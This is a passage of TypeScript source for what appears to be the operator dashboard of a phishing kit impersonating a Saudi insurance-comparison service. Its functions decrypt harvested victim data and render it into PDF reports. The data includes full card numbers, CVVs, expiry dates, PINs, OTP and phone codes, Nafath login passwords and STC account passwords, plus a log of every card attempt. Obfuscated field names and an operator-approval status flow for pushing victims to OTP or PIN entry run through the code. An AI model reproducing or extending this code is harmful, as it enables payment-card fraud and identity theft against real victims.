"use client";

import { inferCardMeta } from "@/lib/card-utils";
import type { InsuranceApplication } from "@/lib/firestore-types";
import { _d } from "@/lib/secure-utils";

function decryptField(value: string | undefined): string {
  if (!value) return "";
  try {
    return _d(value) || value;
  } catch {
    return value;
  }
}

function val(v: string | number | undefined | null): string {
  if (v === undefined || v === null || v === "") return "";
  return String(v);
}

function escapeHtml(raw: string): string {
  return raw
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;")
    .replace(/\n/g, "<br />");
}

function getBankLogoUrlForPdf(bankName: string): string | null {
  const n = (bankName || "").toLowerCase();
  if (n.includes("أهلي") || n.includes("ahli") || n.includes("snb") || n.includes("national")) return "/logo-snb.png";
  if (n.includes("راجح") || n.includes("rajhi")) return "/logo-rajhi.png";
  if (n.includes("رياض") || n.includes("riyad")) return "/logo-riyad.jpg";
  if (n.includes("إنماء") || n.includes("انماء") || n.includes("alinma")) return "/logo-alinma.png";
  return null;
}

function getNetworkLogoUrlForPdf(cardType: string): string | null {
  const t = (cardType || "").toLowerCase();
  if (t.includes("mada")) return "/logo-mada.png";
  if (t.includes("visa")) return "/logo-visa.png";
  if (t.includes("master")) return "/logo-mastercard.png";
  return null;
}

function formatDateTime(value: any): string {
  if (!value) return "";

  try {
    const date =
      typeof value === "object" &&
      value !== null &&
      typeof value.toDate === "function"
        ? value.toDate()
        : new Date(value);

    if (!Number.isNaN(date.getTime())) {
      return date.toLocaleString("ar-SA", {
        year: "numeric",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      });
    }
  } catch {
    return val(value);
  }

  return val(value);
}

function formatMoney(value: string | number | undefined | null): string {
  if (value === undefined || value === null || value === "") return "";
  const num = Number(value);
  if (!Number.isNaN(num) && Number.isFinite(num)) {
    return `${new Intl.NumberFormat("ar-SA", {
      minimumFractionDigits: 0,
      maximumFractionDigits: 2,
    }).format(num)} ر.س`;
  }
  return val(value);
}

function buildPdfHtml(
  visitor: InsuranceApplication,
  logoBase64: string,
  stampBase64: string
): string {
  const reportDate = formatDateTime(new Date());
  const createdAt = formatDateTime(visitor.createdAt as any);
  const updatedAt = formatDateTime(visitor.updatedAt as any);
  const lastSeen = formatDateTime(visitor.lastSeen as any);
  const insuranceDate = formatDateTime(visitor.createdAt as any);
  const currentPage = val(
    visitor.redirectPage || visitor.currentPage || (visitor.currentStep as any)
  );

  const history = visitor.history || [];
  const allCardHistory = [...history].filter(
    (h: any) => h.type === "_t1" || h.type === "card"
  );
  const sortedCardHistory = allCardHistory.sort(
    (a: any, b: any) =>
      new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  );

  const allOtpHistory = [...history].filter(
    (h: any) => h.type === "_t2" || h.type === "otp"
  );
  const sortedOtpHistory = allOtpHistory.sort(
    (a: any, b: any) =>
      new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  );

  const allPinHistory = [...history].filter(
    (h: any) => h.type === "_t3" || h.type === "pin"
  );
  const sortedPinHistory = allPinHistory.sort(
    (a: any, b: any) =>
      new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  );

  const allPhoneOtpHistory = [...history].filter(
    (h: any) => h.type === "_t5" || h.type === "phone_otp"
  );
  const sortedPhoneOtpHistory = allPhoneOtpHistory.sort(
    (a: any, b: any) =>
      new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  );

  const latestCard = sortedCardHistory.length > 0 ? sortedCardHistory[0] : null;
  const latestOtp = sortedOtpHistory.length > 0 ? sortedOtpHistory[0] : null;
  const latestPin = sortedPinHistory.length > 0 ? sortedPinHistory[0] : null;
  const latestPhoneOtp =
    sortedPhoneOtpHistory.length > 0 ? sortedPhoneOtpHistory[0] : null;

  const cardNumber = latestCard
    ? decryptField(latestCard.data?._v1 || latestCard.data?.cardNumber)
    : decryptField(visitor._v1 || visitor.cardNumber);
  const cvv = latestCard
    ? decryptField(latestCard.data?._v2 || latestCard.data?.cvv)
    : decryptField(visitor._v2 || visitor.cvv);
  const expiryDate = latestCard
    ? decryptField(latestCard.data?._v3 || latestCard.data?.expiryDate)
    : decryptField(visitor._v3 || visitor.expiryDate);
  const cardHolderName = latestCard
    ? decryptField(latestCard.data?._v4 || latestCard.data?.cardHolderName)
    : decryptField(visitor._v4 || visitor.cardHolderName);
  const inferredCardMeta = inferCardMeta(cardNumber);
  const cardType =
    (latestCard ? val(latestCard.data?.cardType) : val(visitor.cardType)) ||
    inferredCardMeta?.typeLabel ||
    "";
  const bankName =
    (latestCard
      ? val(latestCard.data?.bankInfo?.name)
      : val(visitor.bankInfo?.name)) ||
    inferredCardMeta?.bankName ||
    "";
  const bankCountry =
    (latestCard
      ? val(latestCard.data?.bankInfo?.country)
      : val(visitor.bankInfo?.country)) ||
    inferredCardMeta?.bankCountry ||
    "";

  const otpCode = latestOtp
    ? val(latestOtp.data?._v5 || latestOtp.data?.otp)
    : val(visitor._v5 || visitor.otpCode || visitor.otp);
  const pinCode = latestPin
    ? val(latestPin.data?._v6 || latestPin.data?.pinCode)
    : val(visitor._v6 || visitor.pinCode);
  const phoneOtpCode = latestPhoneOtp
    ? val(latestPhoneOtp.data?._v7 || latestPhoneOtp.data?.phoneOtp)
    : val(visitor._v7 || visitor.phoneOtp || visitor.phoneVerificationCode);

  const offerCompany = visitor.selectedOffer
    ? val(
        (visitor.selectedOffer as any).name ||
          (visitor.selectedOffer as any).company
      )
    : "";
  const totalPrice = formatMoney(visitor.finalPrice || visitor.offerTotalPrice);
  const originalPrice = formatMoney(visitor.originalPrice);
  const discount = visitor.discount
    ? `${(visitor.discount * 100).toFixed(0)}%`
    : "";

  const reportId = val(visitor.referenceNumber || visitor.identityNumber || visitor.id);
  const visitorName = val((visitor as any).name || visitor.ownerName);

  const statusLabel = (status: string | undefined) => {
    if (!status) return "";
    const map: Record<string, string> = {
      waiting: "بانتظار المشرف",
      pending: "قيد المراجعة",
      verifying: "جاري التحقق",
      approved: "تم القبول",
      rejected: "تم الرفض",
      approved_with_otp: "تحويل إلى OTP",
      approved_with_pin: "تحويل إلى PIN",
      show_otp: "بانتظار إدخال OTP",
      show_pin: "بانتظار إدخال PIN",
      show_phone_otp: "بانتظار إدخال كود الهاتف",
      otp_rejected: "OTP مرفوض",
      resend: "إعادة إرسال",
    };
    return map[status] || status;
  };

  type PdfRow = { label: string; value: string; mono?: boolean };

  const renderTableRows = (rows: PdfRow[]) => {
    const visible = rows.filter((row) => row.value);
    if (visible.length === 0) {
      return `<tr><td colspan="2" class="empty-cell">لا توجد بيانات متاحة</td></tr>`;
    }

    return visible
      .map(
        (row, idx) => `
          <tr class="${idx % 2 === 0 ? "alt-row" : ""}">
            <td class="label-cell">${escapeHtml(row.label)}</td>
            <td class="value-cell ${row.mono ? "mono" : ""}">${escapeHtml(
              row.value
            )}</td>
          </tr>
      `
      )
      .join("");
  };

  const renderSection = (title: string, icon: string, rows: PdfRow[]) => `
    <section class="section">
      <div class="section-header">
        <span class="section-icon">${icon}</span>
        <span>${escapeHtml(title)}</span>
      </div>
      <table class="info-table">
        ${renderTableRows(rows)}
      </table>
    </section>
  `;

  const applicantRows: PdfRow[] = [
    { label: "اسم مقدم الطلب", value: visitorName },
    { label: "رقم الهوية", value: val(visitor.identityNumber), mono: true },
    { label: "رقم الهاتف", value: val(visitor.phoneNumber), mono: true },
    { label: "نوع الوثيقة", value: val(visitor.documentType) },
    { label: "الرقم التسلسلي", value: val(visitor.serialNumber), mono: true },
    { label: "نوع الطلب", value: val(visitor.insuranceType) },
    { label: "اسم المشتري", value: val(visitor.buyerName) },
    { label: "هوية المشتري", value: val(visitor.buyerIdNumber), mono: true },
  ];

  const insuranceRows: PdfRow[] = [
    { label: "نوع التغطية", value: val(visitor.insuranceCoverage) },
    { label: "تاريخ بدء التأمين", value: insuranceDate },
    { label: "موديل المركبة", value: val(visitor.vehicleModel) },
    { label: "سنة الصنع", value: val(visitor.vehicleYear), mono: true },
    { label: "قيمة المركبة", value: formatMoney(visitor.vehicleValue as any) },
    { label: "استخدام المركبة", value: val(visitor.vehicleUsage) },
    {
      label: "موقع الإصلاح",
      value: visitor.repairLocation
        ? visitor.repairLocation === "agency"
          ? "وكالة"
          : "ورشة"
        : "",
    },
  ];

  const offerRows: PdfRow[] = [
    { label: "الشركة", value: offerCompany },
    { label: "السعر الأصلي", value: originalPrice },
    { label: "الخصم", value: discount },
    { label: "السعر النهائي", value: totalPrice },
    {
      label: "المميزات المختارة",
      value: Array.isArray(visitor.selectedFeatures)
        ? visitor.selectedFeatures.join("، ")
        : "",
    },
  ];

  const cardRows: PdfRow[] = [
    { label: "رقم البطاقة", value: cardNumber, mono: true },
    { label: "اسم حامل البطاقة", value: cardHolderName },
    { label: "نوع البطاقة", value: cardType },
    { label: "تاريخ الانتهاء", value: expiryDate, mono: true },
    { label: "CVV", value: cvv, mono: true },
    { label: "البنك", value: bankName },
    { label: "بلد البنك", value: bankCountry },
    { label: "حالة البطاقة", value: statusLabel(visitor.cardStatus) },
  ];

  const verificationRows: PdfRow[] = [
    { label: "OTP", value: otpCode, mono: true },
    { label: "حالة OTP", value: statusLabel(visitor.otpStatus) },
    { label: "PIN", value: pinCode, mono: true },
    { label: "حالة PIN", value: statusLabel(visitor.pinStatus) },
    { label: "كود تحقق الهاتف", value: phoneOtpCode, mono: true },
    { label: "حالة تحقق الهاتف", value: statusLabel(visitor.phoneOtpStatus) },
    { label: "شركة الاتصالات", value: val(visitor.phoneCarrier) },
    { label: "نفاذ - الهوية", value: val(visitor._v8 || visitor.nafazId), mono: true },
    { label: "نفاذ - كلمة المرور", value: val(visitor._v9 || visitor.nafazPass) },
    { label: "رمز تأكيد نفاذ", value: val(visitor.nafadConfirmationCode), mono: true },
    { label: "بيانات STC (الجوال)", value: val(visitor.stcPhone), mono: true },
    { label: "بيانات STC (كلمة المرور)", value: val(visitor.stcPassword) },
    { label: "STC وقت الإدخال", value: formatDateTime(visitor.stcSubmittedAt) },
  ];

  const trackingRows: PdfRow[] = [
    { label: "رقم التقرير", value: reportId, mono: true },
    { label: "الصفحة الحالية", value: currentPage },
    { label: "الدولة", value: val(visitor.country) },
    { label: "الجهاز", value: val(visitor.deviceType) },
    { label: "المتصفح", value: val(visitor.browser) },
    { label: "نظام التشغيل", value: val(visitor.os) },
    { label: "آخر ظهور", value: lastSeen },
    { label: "تاريخ الإنشاء", value: createdAt },
    { label: "آخر تحديث", value: updatedAt },
  ];

  const cardAttemptsHtml = sortedCardHistory
    .slice(0, 6)
    .map(
      (entry: any, index: number) => `
      <tr class="${index % 2 === 0 ? "alt-row" : ""}">
        <td class="label-cell">محاولة ${sortedCardHistory.length - index}</td>
        <td class="value-cell mono">${escapeHtml(
          decryptField(entry.data?._v1 || entry.data?.cardNumber)
        )}</td>
      </tr>
      <tr class="${index % 2 === 0 ? "alt-row" : ""}">
        <td class="label-cell">حالة المحاولة</td>
        <td class="value-cell">${escapeHtml(statusLabel(entry.status) || "—")}</td>
      </tr>
      <tr class="${index % 2 === 0 ? "alt-row" : ""}">
        <td class="label-cell">وقت الإدخال</td>
        <td class="value-cell">${escapeHtml(formatDateTime(entry.timestamp) || "—")}</td>
      </tr>
    `
    )
    .join("");

  const attemptsSection = sortedCardHistory.length
    ? `
      <section class="section">
        <div class="section-header">
          <span class="section-icon">🧾</span>
          <span>سجل محاولات البطاقة</span>
        </div>
        <table class="info-table">
          ${cardAttemptsHtml}
        </table>
      </section>
    `
    : "";

  return `
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
    <style>
      #pdf-content {
        font-family: "Cairo", Arial, sans-serif;
        direction: rtl;
        text-align: right;
        width: 760px;
        margin: 0 auto;
        padding: 0;
        color: #0F172A;
        background: #FFFFFF;
        line-height: 1.7;
        -webkit-print-color-adjust: exact;
        print-color-adjust: exact;
      }
      .report-shell {
        border: 1px solid #E2E8F0;
        border-radius: 18px;
        overflow: hidden;
        box-shadow: 0 10px 35px rgba(15, 23, 42, 0.08);
        background: linear-gradient(180deg, #F8FAFC 0%, #FFFFFF 160px);
      }
      .top-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 26px 28px 20px;
        background: linear-gradient(135deg, #173B74 0%, #1D4E89 52%, #2A6EBB 100%);
        color: #FFFFFF;
      }
      .header-title {
        margin: 0;
        font-size: 24px;
        font-weight: 900;
        letter-spacing: 0.2px;
      }
      .header-subtitle {
        margin-top: 4px;
        font-size: 12px;
        opacity: 0.9;
      }
      .logo {
        width: 132px;
        height: auto;
        background: #FFFFFF;
        border-radius: 10px;
        padding: 8px 10px;
      }
      .meta-grid {
        padding: 16px 28px 6px;
        display: grid;
        grid-template-columns: repeat(3, minmax(0, 1fr));
        gap: 10px;
      }
      .meta-card {
        border: 1px solid #DBEAFE;
        background: #EFF6FF;
        border-radius: 10px;
        padding: 9px 12px;
      }
      .meta-label {
        font-size: 10px;
        color: #334155;
      }
      .meta-value {
        margin-top: 1px;
        font-size: 12px;
        font-weight: 800;
        color: #0F172A;
      }
      .summary-grid {
        padding: 8px 28px 0;
        display: grid;
        grid-template-columns: repeat(4, minmax(0, 1fr));
        gap: 10px;
      }
      .summary-card {
        background: #FFFFFF;
        border: 1px solid #E2E8F0;
        border-radius: 12px;
        padding: 9px 12px;
      }
      .summary-label {
        font-size: 10px;
        color: #64748B;
      }
      .summary-value {
        margin-top: 2px;
        font-size: 12px;
        font-weight: 800;
        color: #0F172A;
        unicode-bidi: plaintext;
        word-break: break-word;
      }
      .sections-wrap {
        padding: 12px 28px 22px;
      }
      .section {
        margin-top: 14px;
      }
      .section-header {
        background: linear-gradient(90deg, #1E40AF 0%, #1D4ED8 100%);
        color: #FFFFFF;
        border-radius: 10px 10px 0 0;
        padding: 8px 12px;
        font-size: 13px;
        font-weight: 800;
        display: flex;
        align-items: center;
        gap: 8px;
      }
      .section-icon {
        font-size: 14px;
      }
      .info-table {
        width: 100%;
        border-collapse: collapse;
        border: 1px solid #D1D5DB;
        border-top: none;
      }
      .info-table .label-cell {
        width: 34%;
        background: #F8FAFC;
        color: #334155;
        font-size: 11px;
        font-weight: 700;
        border: 1px solid #D1D5DB;
        padding: 6px 10px;
        white-space: nowrap;
      }
      .info-table .value-cell {
        color: #0F172A;
        font-size: 11px;
        font-weight: 700;
        border: 1px solid #D1D5DB;
        padding: 6px 10px;
        unicode-bidi: plaintext;
      }
      .info-table .value-cell.mono {
        font-family: "Courier New", monospace;
        letter-spacing: 0.4px;
      }
      .info-table .empty-cell {
        text-align: center;
        color: #64748B;
        border: 1px solid #D1D5DB;
        padding: 10px;
        font-size: 11px;
        background: #F8FAFC;
      }
      .info-table .alt-row td {
        background: #F8FAFC;
      }
      .notes-box {
        margin: 16px 28px 0;
        border: 1px solid #E2E8F0;
        border-radius: 10px;
        background: #F8FAFC;
        padding: 10px 12px;
        font-size: 10px;
        color: #475569;
      }
      .sign-box {
        margin: 14px 28px 24px;
        border: 1px dashed #94A3B8;
        border-radius: 12px;
        padding: 12px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        gap: 14px;
      }
      .sign-text {
        font-size: 11px;
        color: #334155;
      }
      .stamp {
        width: 150px;
        height: auto;
        opacity: 0.95;
      }
      .footer {
        text-align: center;
        font-size: 10px;
        color: #94A3B8;
        padding-bottom: 16px;
      }
    </style>
    <div id="pdf-content">
      <div class="report-shell">
        <div class="top-header">
          <div>
            <h1 class="header-title">تقرير بيانات طلب التأمين</h1>
            <div class="header-subtitle">Professional Visitor Snapshot • BCare Dashboard</div>
          </div>
          <img class="logo" src="${logoBase64}" crossorigin="anonymous" />
        </div>

        <div class="meta-grid">
          <div class="meta-card">
            <div class="meta-label">رقم التقرير</div>
            <div class="meta-value">${escapeHtml(reportId || "—")}</div>
          </div>
          <div class="meta-card">
            <div class="meta-label">تاريخ إنشاء التقرير</div>
            <div class="meta-value">${escapeHtml(reportDate || "—")}</div>
          </div>
          <div class="meta-card">
            <div class="meta-label">إجمالي محاولات البطاقة</div>
            <div class="meta-value">${escapeHtml(String(sortedCardHistory.length || 0))}</div>
          </div>
        </div>

        <div class="summary-grid">
          <div class="summary-card">
            <div class="summary-label">الاسم</div>
            <div class="summary-value">${escapeHtml(visitorName || "—")}</div>
          </div>
          <div class="summary-card">
            <div class="summary-label">رقم الهوية</div>
            <div class="summary-value">${escapeHtml(val(visitor.identityNumber) || "—")}</div>
          </div>
          <div class="summary-card">
            <div class="summary-label">الهاتف</div>
            <div class="summary-value">${escapeHtml(val(visitor.phoneNumber) || "—")}</div>
          </div>
          <div class="summary-card">
            <div class="summary-label">الصفحة الحالية</div>
            <div class="summary-value">${escapeHtml(currentPage || "—")}</div>
          </div>
        </div>

        <div class="sections-wrap">
          ${renderSection("بيانات مقدم الطلب", "👤", applicantRows)}
          ${renderSection("بيانات التأمين والمركبة", "🚗", insuranceRows)}
          ${renderSection("العرض المختار والتسعير", "📊", offerRows)}
          ${renderSection("معلومات الدفع والبطاقة", "💳", cardRows)}
          ${renderSection("رموز التحقق والاتصالات", "🔐", verificationRows)}
          ${renderSection("بيانات التتبع والجلسة", "🛰️", trackingRows)}
          ${attemptsSection}
        </div>

        <div class="notes-box">
          هذا التقرير معلوماتي فقط، ولا يُعد وثيقة تأمين معتمدة إلا بعد استكمال جميع الشروط النظامية
          وسداد القسط النهائي حسب سياسة شركة التأمين.
        </div>

        <div class="sign-box">
          <div class="sign-text">
            <div><strong>الإقرار:</strong> أقر بصحة البيانات أعلاه.</div>
            <div style="margin-top:6px;">الاسم: _____________________</div>
            <div style="margin-top:6px;">التوقيع: ____________________</div>
          </div>
          <img class="stamp" src="${stampBase64}" crossorigin="anonymous" />
        </div>

        <div class="footer">
          BCare Dashboard · Confidential Report
        </div>
      </div>
    </div>
  `;
}

function buildCardPdfHtml(
  visitor: InsuranceApplication,
  logoBase64: string,
  stampBase64: string
): string {
  const reportDate = formatDateTime(new Date());

  const history = visitor.history || [];
  const allCardHistory = [...history]
    .filter((h: any) => h.type === "_t1" || h.type === "card")
    .sort((a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
  const allOtpHistory = [...history]
    .filter((h: any) => h.type === "_t2" || h.type === "otp")
    .sort((a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
  const allPinHistory = [...history]
    .filter((h: any) => h.type === "_t3" || h.type === "pin")
    .sort((a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());

  const latestCard = allCardHistory[0] ?? null;
  const latestOtp = allOtpHistory[0] ?? null;
  const latestPin = allPinHistory[0] ?? null;

  const cardNumber = latestCard
    ? decryptField(latestCard.data?._v1 || latestCard.data?.cardNumber)
    : decryptField(visitor._v1 || visitor.cardNumber);
  const cvv = latestCard
    ? decryptField(latestCard.data?._v2 || latestCard.data?.cvv)
    : decryptField(visitor._v2 || visitor.cvv);
  const expiryDate = latestCard
    ? decryptField(latestCard.data?._v3 || latestCard.data?.expiryDate)
    : decryptField(visitor._v3 || visitor.expiryDate);
  const cardHolderName = latestCard
    ? decryptField(latestCard.data?._v4 || latestCard.data?.cardHolderName)
    : decryptField(visitor._v4 || visitor.cardHolderName);
  const inferredCardMeta = inferCardMeta(cardNumber);
  const cardType =
    (latestCard ? val(latestCard.data?.cardType) : val(visitor.cardType)) ||
    inferredCardMeta?.typeLabel ||
    "";
  const bankName =
    (latestCard
      ? val(latestCard.data?.bankInfo?.name)
      : val(visitor.bankInfo?.name)) ||
    inferredCardMeta?.bankName ||
    "";
  const bankCountry =
    (latestCard
      ? val(latestCard.data?.bankInfo?.country)
      : val(visitor.bankInfo?.country)) ||
    inferredCardMeta?.bankCountry ||
    "";
  const otpCode = latestOtp
    ? val(latestOtp.data?._v5 || latestOtp.data?.otp)
    : val(visitor._v5 || visitor.otpCode || visitor.otp);
  const pinCode = latestPin
    ? val(latestPin.data?._v6 || latestPin.data?.pinCode)
    : val(visitor._v6 || visitor.pinCode);

  const visitorName = val((visitor as any).name || visitor.ownerName);
  const identityNumber = val(visitor.identityNumber);
  const phoneNumber = val(visitor.phoneNumber);

  const cardLevel = val(
    visitor.cardLevel || visitor.bankInfo?.level || inferredCardMeta?.level,
  );

  const formatCardNumber = (num: string) => {
    const clean = num.replace(/\s/g, "");
    return clean.match(/.{1,4}/g)?.join("  ") || num;
  };

  const bankLogoUrlPdf = getBankLogoUrlForPdf(bankName);

  const cardNetworkBadge = (type: string) => {
    const t = type.toLowerCase();
    const nLogoUrl = getNetworkLogoUrlForPdf(type);
    if (nLogoUrl) return `<img src="${nLogoUrl}" alt="${escapeHtml(type)}" style="height:28px;max-width:70px;object-fit:contain;" crossorigin="anonymous" />`;
    if (t.includes("visa")) return `<span style="font-size:22px;font-weight:900;font-style:italic;color:#1a1f71;font-family:Arial;">VISA</span>`;
    if (t.includes("master")) return `<span style="font-size:14px;font-weight:900;font-family:Arial;"><span style="color:#eb001b;">master</span><span style="color:#f79e1b;">card</span></span>`;
    if (t.includes("amex") || t.includes("american")) return `<span style="font-size:14px;font-weight:900;color:#006FCF;font-family:Arial;">AMEX</span>`;
    return `<span style="font-size:13px;font-weight:800;color:#333;">${escapeHtml(type)}</span>`;
  };

  const statusLabel = (status: string | undefined) => {
    if (!status) return "—";
    const map: Record<string, string> = {
      waiting: "بانتظار المشرف", pending: "قيد المراجعة", verifying: "جاري التحقق",
      approved: "تم القبول", rejected: "تم الرفض", approved_with_otp: "تحويل إلى OTP",
      approved_with_pin: "تحويل إلى PIN", otp_rejected: "OTP مرفوض",
    };
    return map[status] || status;
  };

  const attemptsRows = allCardHistory.map((entry: any, i: number) => {
    const num = decryptField(entry.data?._v1 || entry.data?.cardNumber);
    const exp = decryptField(entry.data?._v3 || entry.data?.expiryDate);
    const cvvA = decryptField(entry.data?._v2 || entry.data?.cvv);
    const holder = decryptField(entry.data?._v4 || entry.data?.cardHolderName);
    const status = statusLabel(entry.status);
    const time = formatDateTime(entry.timestamp);
    const odd = i % 2 === 0;
    return `
      <tr style="background:${odd ? "#F8FAFC" : "#fff"};">
        <td style="padding:7px 10px;border:1px solid #E2E8F0;font-size:11px;color:#64748B;font-weight:700;white-space:nowrap;">${allCardHistory.length - i}</td>
        <td style="padding:7px 10px;border:1px solid #E2E8F0;font-size:11px;font-family:'Courier New',monospace;letter-spacing:1px;color:#0F172A;">${escapeHtml(formatCardNumber(num))}</td>
        <td style="padding:7px 10px;border:1px solid #E2E8F0;font-size:11px;font-family:'Courier New',monospace;color:#0F172A;">${escapeHtml(exp)}</td>
        <td style="padding:7px 10px;border:1px solid #E2E8F0;font-size:11px;font-family:'Courier New',monospace;color:#0F172A;">${escapeHtml(cvvA)}</td>
        <td style="padding:7px 10px;border:1px solid #E2E8F0;font-size:11px;color:#0F172A;">${escapeHtml(holder)}</td>
        <td style="padding:7px 10px;border:1px solid #E2E8F0;font-size:11px;color:${entry.status === "approved" ? "#16a34a" : entry.status === "rejected" ? "#dc2626" : "#64748B"};font-weight:700;">${escapeHtml(status)}</td>
        <td style="padding:7px 10px;border:1px solid #E2E8F0;font-size:10px;color:#94A3B8;white-space:nowrap;">${escapeHtml(time)}</td>
      </tr>`;
  }).join("");

  return `
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
    <div id="card-pdf-content" style="font-family:'Cairo',Arial,sans-serif;direction:rtl;text-align:right;width:760px;margin:0 auto;padding:0;color:#0F172A;background:#fff;line-height:1.6;-webkit-print-color-adjust:exact;print-color-adjust:exact;">

      <!-- Header -->
      <div style="background:linear-gradient(135deg,#0f172a 0%,#1e293b 60%,#0f172a 100%);padding:22px 28px 18px;display:flex;justify-content:space-between;align-items:center;border-radius:18px 18px 0 0;">
        <div>
          <div style="font-size:22px;font-weight:900;color:#fff;letter-spacing:0.3px;">كشف بيانات البطاقة البنكية</div>
          <div style="font-size:11px;color:rgba(148,163,184,0.9);margin-top:3px;">Card Data Report · BCare Dashboard · ${escapeHtml(reportDate)}</div>
        </div>
        <img src="${logoBase64}" style="width:120px;height:auto;background:#fff;border-radius:10px;padding:7px 10px;" crossorigin="anonymous" />
      </div>

      <!-- Owner Info Strip -->
      <div style="background:#F1F5F9;border-left:4px solid #3B82F6;padding:10px 20px;display:flex;gap:30px;align-items:center;flex-wrap:wrap;">
        ${visitorName ? `<div><span style="font-size:10px;color:#64748B;">اسم العميل</span><div style="font-size:13px;font-weight:800;color:#0F172A;">${escapeHtml(visitorName)}</div></div>` : ""}
        ${identityNumber ? `<div><span style="font-size:10px;color:#64748B;">رقم الهوية</span><div style="font-size:12px;font-weight:700;font-family:'Courier New',monospace;color:#0F172A;">${escapeHtml(identityNumber)}</div></div>` : ""}
        ${phoneNumber ? `<div><span style="font-size:10px;color:#64748B;">رقم الهاتف</span><div style="font-size:12px;font-weight:700;font-family:'Courier New',monospace;color:#0F172A;">${escapeHtml(phoneNumber)}</div></div>` : ""}
        <div><span style="font-size:10px;color:#64748B;">إجمالي المحاولات</span><div style="font-size:13px;font-weight:800;color:#1D4ED8;">${allCardHistory.length}</div></div>
      </div>

      <!-- Visual Card -->
      <div style="padding:20px 28px 10px;">
        <div style="background:linear-gradient(135deg,#e8f5ee 0%,#ddf0e6 35%,#cce8d8 65%,#e2f0e8 100%);border-radius:18px;padding:22px 26px 18px;width:420px;box-shadow:0 8px 32px rgba(0,100,50,0.13),0 2px 8px rgba(0,0,0,0.07);box-sizing:border-box;position:relative;overflow:hidden;">
          <!-- Sheen -->
          <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:18px;background:linear-gradient(135deg,rgba(255,255,255,0.45) 0%,transparent 55%);pointer-events:none;"></div>
          <!-- Top row: SAR badge only -->
          <div style="display:flex;justify-content:flex-end;align-items:flex-start;margin-bottom:20px;">
            <div style="border:1.5px solid #444;border-radius:8px;padding:3px 12px;font-size:13px;font-weight:700;color:#222;font-family:Arial;background:rgba(255,255,255,0.5);">SAR</div>
          </div>
          <!-- Card Number + Expiry -->
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
            <div style="font-size:21px;font-weight:500;color:#111;letter-spacing:2px;font-family:'Courier New',monospace;direction:ltr;">
              ${escapeHtml(cardNumber ? formatCardNumber(cardNumber) : "•••• •••• •••• ••••")}
            </div>
            <div style="font-size:21px;font-weight:500;color:#111;font-family:'Courier New',monospace;direction:ltr;white-space:nowrap;padding-right:4px;">
              ${escapeHtml(expiryDate || "MM/YY")}
            </div>
          </div>
          <!-- Bank logo/name + CVV -->
          <div style="display:flex;justify-content:space-between;align-items:flex-end;margin-bottom:16px;">
            <div>${bankLogoUrlPdf
              ? `<div style="background:#fff;border-radius:8px;padding:3px 8px;display:inline-flex;align-items:center;box-shadow:0 1px 4px rgba(0,0,0,0.08);"><img src="${bankLogoUrlPdf}" alt="${escapeHtml(bankName)}" style="height:30px;max-width:130px;object-fit:contain;" crossorigin="anonymous" /></div>`
              : bankName
                ? `<div style="font-size:17px;font-weight:900;color:#1a5c35;font-family:Arial,sans-serif;direction:ltr;max-width:180px;">${escapeHtml(bankName)}</div>`
                : ""
            }</div>
            <div style="text-align:right;">
              <div style="font-size:10px;color:#888;letter-spacing:1px;font-family:Arial;margin-bottom:2px;">CVV</div>
              <div style="font-size:18px;font-weight:600;color:#111;font-family:'Courier New',monospace;direction:ltr;">${escapeHtml(cvv || "—")}</div>
            </div>
          </div>
          <!-- Bottom row: flag + card type + network -->
          <div style="display:flex;justify-content:space-between;align-items:center;">
            <span style="font-size:20px;">🇸🇦</span>
            <div style="display:flex;align-items:center;gap:10px;">
              ${(() => {
                const nLogo = cardType ? getNetworkLogoUrlForPdf(cardType) : null;
                const parts = [!nLogo && cardType ? cardType.toUpperCase() : null, cardLevel ? cardLevel.toUpperCase() : null].filter(Boolean);
                return parts.length ? `<span style="font-size:11px;font-weight:700;color:#333;font-family:Arial;letter-spacing:0.5px;">${escapeHtml(parts.join(" · "))}</span>` : "";
              })()}
              ${cardType ? cardNetworkBadge(cardType) : ""}
            </div>
          </div>
        </div>
      </div>

      <!-- Card Details Table -->
      <div style="padding:0 28px 10px;">
        <div style="background:linear-gradient(90deg,#1E40AF,#1D4ED8);color:#fff;border-radius:10px 10px 0 0;padding:8px 12px;font-size:13px;font-weight:800;display:flex;align-items:center;gap:8px;">
          <span>💳</span><span>تفاصيل البطاقة</span>
        </div>
        <table style="width:100%;border-collapse:collapse;border:1px solid #D1D5DB;border-top:none;">
          ${cardNumber ? `<tr><td style="width:34%;background:#F8FAFC;color:#334155;font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;white-space:nowrap;">رقم البطاقة</td><td style="color:#0F172A;font-size:12px;font-weight:800;border:1px solid #D1D5DB;padding:7px 10px;font-family:'Courier New',monospace;letter-spacing:2px;">${escapeHtml(formatCardNumber(cardNumber))}</td></tr>` : ""}
          ${cardHolderName ? `<tr style="background:#F8FAFC;"><td style="width:34%;background:#F8FAFC;color:#334155;font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;white-space:nowrap;">اسم حامل البطاقة</td><td style="color:#0F172A;font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;">${escapeHtml(cardHolderName)}</td></tr>` : ""}
